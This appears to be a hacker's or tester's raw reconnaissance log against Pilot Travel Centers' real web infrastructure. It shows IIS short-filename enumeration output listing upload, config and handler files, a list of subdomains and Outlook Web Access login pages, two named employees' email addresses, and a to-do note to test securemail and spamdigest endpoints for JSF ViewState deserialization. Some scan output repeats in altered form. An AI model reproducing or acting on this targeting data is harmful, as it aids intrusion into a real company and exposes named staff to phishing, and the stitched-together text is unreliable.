+https://mail.pilottravelcenters.com [302]https://autodiscover.pilottravelcenters.com [302]https://webmail.pilottravelcenters.com [302]https://www.fuel.pilottravelcenters.com [503]https://officeonline.pilottravelcenters.com [404].
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/x/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+_CONTR1             _CONTR?
+APP_BR1             APP_BR?
+WEB1.CON            WEB.CON?
+SETTIN1.INI         SETTIN?.INI? 
+PRIVAT1.SVC         PRIVAT?.SVC? 
+REMOTE1.ASH         REMOTE?.ASH? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 1038; Retries: 0; Sent 223249 bytes; Received 1570627 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/m
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/m/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PPTSCR1             PPTSCR?
+APP_SC1             APP_SC?             APP_SCRIPTS
+WEB1.CON            WEB.CON?
+APP_BR1             APP_BR?
+BROADC2             BROADC?
+BROADC1             BROADC?
+PRESEN1.ASM         PRESEN?.ASM? 
+PUTDAT1.ASH         PUTDAT?.ASH? 
+SETTIN1.INI         SETTIN?.INI? 
+DIAGNO1.ASH         DIAGNO?.ASH? 
+REMOTE1.ASH         REMOTE?.ASH? 
+WSAUPL1.ASH         WSAUPL?.ASH? 
+PRESEN2.ASM         PRESEN?.ASM? 
+GETDAT1.ASH         GETDAT?.ASH?        GETDATA.ASHX
+PARTIC1.ASP         PARTIC?.ASP? 
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+PARTIC2.ASP         PARTIC?.ASP? 
+PRESEN1.ASP         PRESEN?.ASP? 
+RESOUR~1             RESOUR?             RESOURCES
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/m/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/m/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.JS          MICROS?.JS 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 2689; Retries: 0; Sent 584732 bytes; Received 3921544 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/p
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/INFO.ASPX
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PPTTEM1             PPTTEM?
+PPTSTA1             PPTSTA?
+PPTSCR1             PPTSCR?
+PPTRES1             PPTRES?
+APP_SC1             APP_SC?             APP_SCRIPTS
+APP_BR1             APP_BR?
+WEB1.CON            WEB.CON?
+MPPT1.ASP           MPPT.ASP?
+INFO1.ASP           INFO.ASP?           INFO.ASPX
+MPPTC1.ASP          MPPTC.ASP? 
+EDITIM1.ASH         EDITIM?.ASH? 
+ODPHAN1.ASH         ODPHAN?.ASH? 
+O365SH1.ASH         O365SH?.ASH? 
+POWERP1.ASH         POWERP?.ASH? 
+POWERP1.ASM         POWERP?.ASM? 
+POWERP1.ASP         POWERP?.ASP? 
+PPTPAS1.ASH         PPTPAS?.ASH? 
+PPTSPE1.ASH         PPTSPE?.ASH? 
+PPTCON1.ASP         PPTCON?.ASP? 
+PPTINS1.ASH         PPTINS?.ASH? 
+PREVIE1.ASH         PREVIE?.ASH? 
+PRESEN1.ASH         PRESEN?.ASH? 
+PRINTH1.ASH         PRINTH?.ASH? 
+DIAGNO1.ASH         DIAGNO?.ASH? 
+MIMAGE1.ASH         MIMAGE?.ASH? 
+MEDIAH1.ASH         MEDIAH?.ASH? 
+IMAGES1.ASH         IMAGES?.ASH? 
+APPSET1.ASH         APPSET?.ASH? 
+MIMAGE2.ASH         MIMAGE?.ASH? 
+POWERP2.ASP         POWERP?.ASP? 
+SETTIN1.INI         SETTIN?.INI? 
+GLOBAL1.ASA         GLOBAL?.ASA? 
+REMOTE1.ASH         REMOTE?.ASH? 
+RENAME1.ASH         RENAME?.ASH? 
+WSAUPL1.ASH         WSAUPL?.ASH? 
+WACOFF1.ASH         WACOFF?.ASH? 
+TEMPLA1.ASH         TEMPLA?.ASH? 
+RESOUR1             RESOUR?             RESOURCES
+IMAGEH1.ASH         IMAGEH?.ASH?        IMAGEHANDLER.ASHX
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+UPLOAD1.ASH         UPLOAD?.ASH? 
+CLIENT1             CLIENT?             CLIENTBIN
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS1.XAP         MICROS?.XAP? 
+MICROS2.XAP         MICROS?.XAP? 
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+MICROS1.JS          MICROS?.JS 
+WACAIR~1.JS          WACAIR?.JS 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 5947; Retries: 0; Sent 1293811 bytes; Received 8901799 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/o
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/GETIMAGE.ASHX
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+APP_SC1             APP_SC?             APP_SCRIPTS
+WEB1.CON            WEB.CON?
+OFFICE1.ASH         OFFICE?.ASH? 
+ONENOT1.ASH         ONENOT?.ASH? 
+ONENOT1.ASP         ONENOT?.ASP? 
+O365SH1.ASH         O365SH?.ASH? 
+RESREA1.ASH         RESREA?.ASH? 
+REMOTE1.ASH         REMOTE?.ASH? 
+RENAME1.ASH         RENAME?.ASH? 
+APPSFO1.ASH         APPSFO?.ASH? 
+WORDSA1.SVC         WORDSA?.SVC? 
+SETTIN1.INI         SETTIN?.INI? 
+WORDOA1.ASH         WORDOA?.ASH? 
+WORDED1.ASP         WORDED?.ASP? 
+WSAUPL1.ASH         WSAUPL?.ASH? 
+DIAGNO1.ASH         DIAGNO?.ASH? 
+PICTUR1.ASH         PICTUR?.ASH? 
+CLIPAR1.ASH         CLIPAR?.ASH? 
+GETIMA1.ASH         GETIMA?.ASH?        GETIMAGE.ASHX
+RESOUR1             RESOUR?             RESOURCES
+FILEUP1.ASH         FILEUP?.ASH?        FILEUPLOAD.ASHX
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+TEMPLA1             TEMPLA?             TEMPLATES
+TEMPLA1.ASH         TEMPLA?.ASH? 
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/TEMPLATES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+ONENOT1.JS          ONENOT?.JS 
+ONF6E91.JS          ONF6E9?.JS 
+ONE3BF1.JS          ONE3BF?.JS 
+JQUERY1.JS          JQUERY?.JS          JQUERY.MIN.JS
+ONC22B1.JS          ONC22B?.JS 
+ON8A8A1.JS          ON8A8A?.JS 
+ON55241.JS          ON5524?.JS 
+MICROS1.JS          MICROS?.JS 
+ON81C41.JS          ON81C4?.JS 
+RECORD1.JS          RECORD?.JS 
+ON0E511.JS          ON0E51?.JS 
+WEFGAL1.JS          WEFGAL?.JS 
+WORDED1.JS          WORDED?.JS 
+WOCDAA1.JS          WOCDAA?.JS 
+WODFEB1.JS          WODFEB?.JS 
+WO8E531.JS          WO8E53?.JS 
+WO1DEE1.JS          WO1DEE?.JS 
+WO7BFC1.JS          WO7BFC?.JS 
+WO64851.JS          WO6485?.JS 
+WACAIR1.JS          WACAIR?.JS 
+WO0A881.JS          WO0A88?.JS 
+ONENOT2.JS          ONENOT?.JS 
+RECORD2.JS          RECORD?.JS 
+WORDED2.JS          WORDED?.JS 
+WO213E1.JS          WO213E?.JS 
+WORDED4.JS          WORDED?.JS 
+ONENOT3.JS          ONENOT?.JS 
+ONENOT4.JS          ONENOT?.JS 
+WORDED3.JS          WORDED?.JS 
+JQUERY~2.JS          JQUERY?.JS 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 7632; Retries: 0; Sent 1701865 bytes; Received 11332526 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/op
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/op/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+VIEW1.ASP           VIEW.ASP?           VIEW.ASPX
+EMBED1.ASP          EMBED.ASP?          EMBED.ASPX
+FILETO1.HTM         FILETO?.HTM? 
+WRONGF1.HTM         WRONGF?.HTM? 
+SETTIN1.INI         SETTIN?.INI? 
+FILENO1.HTM         FILENO?.HTM?        FILENOTFOUND.HTM
+ERRORP1.HTM         ERRORP?.HTM?        ERRORPAGE.HTM
+GENERA1.ASP         GENERA?.ASP?        GENERATE.ASPX
+SERVIC1.HTM         SERVIC?.HTM? 
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+RESOUR1             RESOUR?             RESOURCES
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/op/RESOURCES/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+FAVICO2.ICO         FAVICO?.ICO? 
+FAVICO1.ICO         FAVICO?.ICO? 
+FAVICO~3.ICO         FAVICO?.ICO? 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 2133; Retries: 0; Sent 466251 bytes; Received 3217351 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/we
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+APP_SC1             APP_SC?             APP_SCRIPTS
+APP_BR1             APP_BR?
+OFFICE1.ASH         OFFICE?.ASH? 
+ONENOT1.ASH         ONENOT?.ASH? 
+ONENOT1.ASP         ONENOT?.ASP? 
+O365SH1.ASH         O365SH?.ASH? 
+PICTUR1.ASH         PICTUR?.ASH? 
+GETIMA1.ASH         GETIMA?.ASH?        GETIMAGE.ASHX
+WORDOA1.ASH         WORDOA?.ASH? 
+WORDED1.ASP         WORDED?.ASP? 
+WSAUPL1.ASH         WSAUPL?.ASH? 
+SETTIN1.INI         SETTIN?.INI? 
+REMOTE1.ASH         REMOTE?.ASH? 
+RESREA1.ASH         RESREA?.ASH? 
+FILEUP1.ASH         FILEUP?.ASH?        FILEUPLOAD.ASHX
+RENAME1.ASH         RENAME?.ASH? 
+DIAGNO1.ASH         DIAGNO?.ASH? 
+APPSFO1.ASH         APPSFO?.ASH? 
+CLIPAR1.ASH         CLIPAR?.ASH? 
+TEMPLA1             TEMPLA?             TEMPLATES
+TEMPLA1.ASH         TEMPLA?.ASH? 
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+RESOUR1             RESOUR?             RESOURCES
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/TEMPLATES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/we/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+WACAIR1.JS          WACAIR?.JS 
+WODFEB1.JS          WODFEB?.JS 
+WOCDAA1.JS          WOCDAA?.JS 
+WORDED1.JS          WORDED?.JS 
+WO8E531.JS          WO8E53?.JS 
+WO7BFC1.JS          WO7BFC?.JS 
+WEFGAL1.JS          WEFGAL?.JS 
+WO1DEE1.JS          WO1DEE?.JS 
+WO64851.JS          WO6485?.JS 
+MICROS1.JS          MICROS?.JS 
+WO0A881.JS          WO0A88?.JS 
+WO213E1.JS          WO213E?.JS 
+ONENOT1.JS          ONENOT?.JS 
+JQUERY1.JS          JQUERY?.JS          JQUERY.MIN.JS
+ONF6E91.JS          ONF6E9?.JS 
+ONC22B1.JS          ONC22B?.JS 
+ONE3BF1.JS          ONE3BF?.JS 
+ON55241.JS          ON5524?.JS 
+ON8A8A1.JS          ON8A8A?.JS 
+ONENOT2.JS          ONENOT?.JS 
+ON81C41.JS          ON81C4?.JS 
+ONENOT3.JS          ONENOT?.JS 
+WORDED2.JS          WORDED?.JS 
+WORDED3.JS          WORDED?.JS 
+ON0E511.JS          ON0E51?.JS 
+ONENOT4.JS          ONENOT?.JS 
+WORDED4.JS          WORDED?.JS 
+JQUERY~2.JS          JQUERY?.JS 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 7245; Retries: 0; Sent 1622085 bytes; Received 10734778 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/oh
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/oh/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+SETTIN1.INI         SETTIN?.INI? 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 241; Retries: 0; Sent 51640 bytes; Received 349337 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/wv
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/wv/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+APP_SC1             APP_SC?             APP_SCRIPTS
+APP_BR1             APP_BR?
+RESOUR1             RESOUR?             RESOURCES
+MWORD1.ASP          MWORD.ASP? 
+REMOTE1.ASH         REMOTE?.ASH? 
+RESREA1.ASH         RESREA?.ASH? 
+TEMPLA1.ASH         TEMPLA?.ASH? 
+MRESRE2.ASH         MRESRE?.ASH? 
+O365SH1.ASH         O365SH?.ASH? 
+WSAUPL1.ASH         WSAUPL?.ASH? 
+WORDCO1.ASP         WORDCO?.ASP? 
+COMMEN1.ASH         COMMEN?.ASH? 
+WORDPR1.ASH         WORDPR?.ASH? 
+WORDVI1.ASP         WORDVI?.ASP? 
+MRESRE1.ASH         MRESRE?.ASH? 
+MWORDC1.ASP         MWORDC?.ASP? 
+GLOBAL1.ASA         GLOBAL?.ASA? 
+DOCDAT1.ASH         DOCDAT?.ASH? 
+SETTIN1.INI         SETTIN?.INI? 
+DIAGNO1.ASH         DIAGNO?.ASH? 
+DEFAUL1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/wv/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB1.CON            WEB.CON?
+WORDVI1.JS          WORDVI?.JS 
+WO893F1.JS          WO893F?.JS 
+WO9D381.JS          WO9D38?.JS 
+WACAIR1.JS          WACAIR?.JS 
+MFCCHE1.JS          MFCCHE?.JS 
+WO1A761.JS          WO1A76?.JS 
+MICROS1.JS          MICROS?.JS 
+WORDVI3.JS          WORDVI?.JS 
+WORDVI4.JS          WORDVI?.JS 
+WORDVI~2.JS          WORDVI?.JS 
+════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/wv/RESOURCES/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MWORDA2.CSS         MWORDA?.CSS? 
+MWORDA1.CSS         MWORDA?.CSS? 
+════════════════════════════════════════════════════════════════════════════════Finished! Requests: 4715; Retries: 0; Sent 1040726 bytes; Received 7154407 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/en-us
+ Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark https://spamdigest.pilottravelcenters.com:10020
+https://www.fuel.pilottravelcenters.com
+https://knoxexpress2.pilottravelcenters.com:8443
+https://spamdigest.pilottravelcenters.com:10000
+https://fuel.pilottravelcenters.com
+https://officeonline.pilottravelcenters.com
+https://vr.pilottravelcenters.com
+https://www.pilottravelcenters.com/VRMobile
+https://spamdigest.pilottravelcenters.com:10000/admin
+https://www.pilottravelcenters.com/VRMobile/
+https://www.pilottravelcenters.com
+https://webmail.pilottravelcenters.com
+https://mail.pilottravelcenters.com
+https://mail.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fmail.pilottravelcenters.com%2fowa&reason=0
+https://webmail.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fwebmail.pilottravelcenters.com%2fowa&reason=0
+https://spamdigest.pilottravelcenters.com
+https://link.pilottravelcenters.com
+https://recruitment.pilottravelcenters.com
+https://securemail.pilottravelcenters.com
+https://knoxexpress1.pilottravelcenters.com:8443
+https://pilottravelcenters.com
+https://autodiscover.pilottravelcenters.com
+https://autodiscover.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fautodiscover.pilottravelcenters.com%2fowa&reason=0kristi.snyder@pilottravelcenters.com
+https://socgov18.my.site.com/s/global-search/pilottravelcenters.com
+joey.cupp@pilottravelcenters.com
+
+
+
+https://fuel.pilottravelcenters.com [503]
+https://officeonline.pilottravelcenters.com [404]
+https://pilottravelcenters.com/JScripts/preloadImages.js [200]
+https://securemail.pilottravelcenters.com [403]
+https://spamdigest.pilottravelcenters.com [403]
+https://recruitment.pilottravelcenters.com [200]
+https://www.fuel.pilottravelcenters.com [503]
+https://www.pilottravelcenters.com/JScripts/preloadImages.js [200]
+https://fuel.pilottravelcenters.com/ [503]
+https://pilottravelcenters.com/vrmobile/ [200]
+https://recruitment.pilottravelcenters.com/ [200]
+https://www.fuel.pilottravelcenters.com/ [503]
+https://pilottravelcenters.com/vrmobile/default.aspx [200]
+https://www.pilottravelcenters.com/JScripts/preloadImages.js [200]
+
+
+
+https://www.pilottravelcenters.com/VRMobile
+https://mail.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fmail.pilottravelcenters.com%2fowa&reason=0
+https://webmail.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fwebmail.pilottravelcenters.com%2fowa&reason=0
+https://autodiscover.pilottravelcenters.com/owa/auth/logon.aspx?url=https%3a%2f%2fautodiscover.pilottravelcenters.com%2fowa&reason=0
+
+https://spamdigest.pilottravelcenters.com/securereader/init.jsf?brand=a8ccbce
+
+
+
+check for Java JSF ViewState (.faces) Deserialization
+3
+https://securemail.pilottravelcenters.com/securereader/init.jsf?brand=a8ccbce
+
+
+
+https://pilottravelcenters.com 
+https://www.pilottravelcenters.com
+
+
+ [301]
+
+
+
+
+
+https://vr.pilottravelcenters.com [301]
+
+
+
+https://fuel.pilottravelcenters.com [503]
+https://recruitment.pilottravelcenters.com [200]
+https://mail.pilottravelcenters.com [302]
+
+https://autodiscover.pilottravelcenters.com [302]
+
+
+
+https://webmail.pilottravelcenters.com [302]
+
+https://www.fuel.pilottravelcenters.com [503]
+
+
+
+https://officeonline.pilottravelcenters.com [404]
+
+.
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/x/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+_CONTR~1             _CONTR?    
+APP_BR~1             APP_BR?    
+WEB~1.CON            WEB.CON?   
+SETTIN~1.INI         SETTIN?.INI? 
+PRIVAT~1.SVC         PRIVAT?.SVC? 
+REMOTE~1.ASH         REMOTE?.ASH? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 1038; Retries: 0; Sent 223249 bytes; Received 1570627 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/m
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/m/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PPTSCR~1             PPTSCR?    
+APP_SC~1             APP_SC?             APP_SCRIPTS
+WEB~1.CON            WEB.CON?   
+APP_BR~1             APP_BR?    
+BROADC~2             BROADC?    
+BROADC~1             BROADC?    
+PRESEN~1.ASM         PRESEN?.ASM? 
+PUTDAT~1.ASH         PUTDAT?.ASH? 
+SETTIN~1.INI         SETTIN?.INI? 
+DIAGNO~1.ASH         DIAGNO?.ASH? 
+REMOTE~1.ASH         REMOTE?.ASH? 
+WSAUPL~1.ASH         WSAUPL?.ASH? 
+PRESEN~2.ASM         PRESEN?.ASM? 
+GETDAT~1.ASH         GETDAT?.ASH?        GETDATA.ASHX
+PARTIC~1.ASP         PARTIC?.ASP? 
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+PARTIC~2.ASP         PARTIC?.ASP? 
+PRESEN~1.ASP         PRESEN?.ASP? 
+RESOUR~1             RESOUR?             RESOURCES
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/m/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/m/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.JS          MICROS?.JS 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 2689; Retries: 0; Sent 584732 bytes; Received 3921544 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/p
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/INFO.ASPX
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+PPTTEM~1             PPTTEM?    
+PPTSTA~1             PPTSTA?    
+PPTSCR~1             PPTSCR?    
+PPTRES~1             PPTRES?    
+APP_SC~1             APP_SC?             APP_SCRIPTS
+APP_BR~1             APP_BR?    
+WEB~1.CON            WEB.CON?   
+MPPT~1.ASP           MPPT.ASP?  
+INFO~1.ASP           INFO.ASP?           INFO.ASPX
+MPPTC~1.ASP          MPPTC.ASP? 
+EDITIM~1.ASH         EDITIM?.ASH? 
+ODPHAN~1.ASH         ODPHAN?.ASH? 
+O365SH~1.ASH         O365SH?.ASH? 
+POWERP~1.ASH         POWERP?.ASH? 
+POWERP~1.ASM         POWERP?.ASM? 
+POWERP~1.ASP         POWERP?.ASP? 
+PPTPAS~1.ASH         PPTPAS?.ASH? 
+PPTSPE~1.ASH         PPTSPE?.ASH? 
+PPTCON~1.ASP         PPTCON?.ASP? 
+PPTINS~1.ASH         PPTINS?.ASH? 
+PREVIE~1.ASH         PREVIE?.ASH? 
+PRESEN~1.ASH         PRESEN?.ASH? 
+PRINTH~1.ASH         PRINTH?.ASH? 
+DIAGNO~1.ASH         DIAGNO?.ASH? 
+MIMAGE~1.ASH         MIMAGE?.ASH? 
+MEDIAH~1.ASH         MEDIAH?.ASH? 
+IMAGES~1.ASH         IMAGES?.ASH? 
+APPSET~1.ASH         APPSET?.ASH? 
+MIMAGE~2.ASH         MIMAGE?.ASH? 
+POWERP~2.ASP         POWERP?.ASP? 
+SETTIN~1.INI         SETTIN?.INI? 
+GLOBAL~1.ASA         GLOBAL?.ASA? 
+REMOTE~1.ASH         REMOTE?.ASH? 
+RENAME~1.ASH         RENAME?.ASH? 
+WSAUPL~1.ASH         WSAUPL?.ASH? 
+WACOFF~1.ASH         WACOFF?.ASH? 
+TEMPLA~1.ASH         TEMPLA?.ASH? 
+RESOUR~1             RESOUR?             RESOURCES
+IMAGEH~1.ASH         IMAGEH?.ASH?        IMAGEHANDLER.ASHX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+UPLOAD~1.ASH         UPLOAD?.ASH? 
+CLIENT~1             CLIENT?             CLIENTBIN
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/CLIENTBIN/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+MICROS~1.XAP         MICROS?.XAP? 
+MICROS~2.XAP         MICROS?.XAP? 
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/RESOURCES/
+Running: <unknown>
+Vulnerable: No (or no 8.3 files exist)
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/p/APP_SCRIPTS/
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+WEB~1.CON            WEB.CON?   
+MICROS~1.JS          MICROS?.JS 
+WACAIR~1.JS          WACAIR?.JS 
+════════════════════════════════════════════════════════════════════════════════
+
+Finished! Requests: 5947; Retries: 0; Sent 1293811 bytes; Received 8901799 bytes
+root@nmsr:~/pilottravelcenters.com/pilottravelcenters.com# shortscan https://officeonline.pilottravelcenters.com/o
+🌀 Shortscan v0.9.0 · an IIS short filename enumeration tool by bitquark
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/GETIMAGE.ASHX
+Running: <unknown>
+Vulnerable: Yes!
+════════════════════════════════════════════════════════════════════════════════
+APP_SC~1             APP_SC?             APP_SCRIPTS
+WEB~1.CON            WEB.CON?   
+OFFICE~1.ASH         OFFICE?.ASH? 
+ONENOT~1.ASH         ONENOT?.ASH? 
+ONENOT~1.ASP         ONENOT?.ASP? 
+O365SH~1.ASH         O365SH?.ASH? 
+RESREA~1.ASH         RESREA?.ASH? 
+REMOTE~1.ASH         REMOTE?.ASH? 
+RENAME~1.ASH         RENAME?.ASH? 
+APPSFO~1.ASH         APPSFO?.ASH? 
+WORDSA~1.SVC         WORDSA?.SVC? 
+SETTIN~1.INI         SETTIN?.INI? 
+WORDOA~1.ASH         WORDOA?.ASH? 
+WORDED~1.ASP         WORDED?.ASP? 
+WSAUPL~1.ASH         WSAUPL?.ASH? 
+DIAGNO~1.ASH         DIAGNO?.ASH? 
+PICTUR~1.ASH         PICTUR?.ASH? 
+CLIPAR~1.ASH         CLIPAR?.ASH? 
+GETIMA~1.ASH         GETIMA?.ASH?        GETIMAGE.ASHX
+RESOUR~1             RESOUR?             RESOURCES
+FILEUP~1.ASH         FILEUP?.ASH?        FILEUPLOAD.ASHX
+DEFAUL~1.ASP         DEFAUL?.ASP?        DEFAULT.ASPX
+TEMPLA~1             TEMPLA?             TEMPLATES
+TEMPLA~1.ASH         TEMPLA?.ASH? 
+════════════════════════════════════════════════════════════════════════════════
+
+════════════════════════════════════════════════════════════════════════════════
+URL: https://officeonline.pilottravelcenters.com/o/TEMPLATES/
+Running: <unknown>
